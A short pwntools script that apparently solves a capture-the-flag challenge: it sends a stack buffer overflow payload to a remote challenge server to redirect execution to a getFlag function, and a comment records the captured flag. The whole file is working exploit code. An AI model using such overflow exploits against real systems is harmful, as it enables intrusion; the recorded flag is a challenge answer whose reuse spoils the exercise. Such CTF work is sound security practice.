from pwn import *

# context.arch = 'i386'
# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h']

# p = gdb.debug('./challenge.elf', '''
#     b *0x80492d2
#     b *0x8049256
#     continue
# ''')

p = remote('challenge.ctf.games', 31070)

p.recvuntil(b"All you have to do is make a call to the `getFlag()` function. That's it!\n")
p.sendline(b'A'*0x28+p32(0x8049214)+b'A'*0x4+p32(0x1)+p32(0x23))

p.interactive()

# flag{8e9e2e4ec228db4207791e0a534716c3}